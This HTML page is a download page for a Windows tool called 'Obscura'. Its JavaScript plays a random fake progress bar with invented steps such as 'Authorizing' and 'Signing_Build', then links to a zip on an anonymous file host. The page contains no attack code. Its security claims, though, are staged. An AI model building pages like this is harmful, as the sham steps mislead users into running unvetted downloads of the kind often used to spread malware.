<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deploy Obscura</title>
    <style>
        :root {
            --bg: #050208;
            --purple: #ae47ff;
            --purple-glow: rgba(174, 71, 255, 0.4);
            --card-bg: #0d0814;
            --text: #ffffff;
            --text-mute: #b0a3bd;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background-color: var(--bg);
            background-image: radial-gradient(circle at center, #1a082e 0%, var(--bg) 100%);
            color: var(--text);
            font-family: 'Inter', sans-serif;
            display: flex; align-items: center; justify-content: center;
            min-height: 100vh;
        }

        .download-card {
            width: 100%; max-width: 480px;
            background: var(--card-bg);
            border: 1px solid rgba(174, 71, 255, 0.3);
            border-radius: 32px; padding: 48px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 30px rgba(174, 71, 255, 0.1);
        }

        h2 { font-size: 2rem; font-weight: 800; margin-bottom: 12px; letter-spacing: -1px; }
        .desc { color: var(--text-mute); font-size: 1rem; margin-bottom: 40px; }

        .loader-container { margin: 32px 0; }
        .track { width: 100%; height: 6px; background: rgba(255,255,255,0.05); border-radius: 10px; overflow: hidden; }
        .fill { height: 100%; width: 0%; background: var(--purple); box-shadow: 0 0 15px var(--purple); transition: width 0.4s ease; }

        .status-msg { font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--purple); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }

        .btn-action {
            width: 100%; background: var(--purple); color: #fff;
            padding: 18px; border-radius: 16px; font-weight: 700;
            border: none; cursor: pointer; transition: 0.3s;
            box-shadow: 0 10px 20px var(--purple-glow);
        }

        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 15px 30px var(--purple); }
        
        .hidden { display: none; }
        .success-check { font-size: 3rem; color: #00ffa3; margin-bottom: 20px; }
        
        a.btn-final {
            display: block; text-align: center; text-decoration: none;
            background: #fff; color: #000; padding: 18px;
            border-radius: 16px; font-weight: 700;
        }
    </style>
</head>
<body>

    <div class="download-card">
        <div id="step-1">
            <h2>Initialize Obscura</h2>
            <p class="desc">Prepare your system for high-performance execution. Build v2.4.1</p>
            <button class="btn-action" onclick="startDownload()">Generate Secure Link</button>
        </div>

        <div id="step-2" class="hidden">
            <div class="status-msg" id="status">Syncing_Nodes...</div>
            <div class="loader-container">
                <div class="track"><div class="fill" id="bar"></div></div>
            </div>
            <p style="font-size: 12px; color: var(--text-mute);">Optimizing bytecode for Windows 10/11...</p>
        </div>

        <div id="step-3" class="hidden">
            <div class="success-check">✦</div>
            <h2>Ready for Action</h2>
            <p class="desc">Your encrypted build has been finalized.</p>
            <a href="https://gofile.io/d/jYQdZY" class="btn-final">Download Obscura.zip</a>
        </div>
    </div>

    <script>
        function startDownload() {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');

            const bar = document.getElementById('bar');
            const status = document.getElementById('status');
            const messages = ["Authorizing...", "Injecting_Assets...", "Signing_Build...", "Finalizing..."];
            let progress = 0;

            const timer = setInterval(() => {
                progress += Math.random() * 12;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(timer);
                    setTimeout(() => {
                        document.getElementById('step-2').classList.add('hidden');
                        document.getElementById('step-3').classList.remove('hidden');
                    }, 600);
                }
                bar.style.width = progress + '%';
                
                if (progress > 20) status.innerText = messages[0];
                if (progress > 50) status.innerText = messages[1];
                if (progress > 80) status.innerText = messages[2];
            }, 400);
        }
    </script>
</body>
</html>
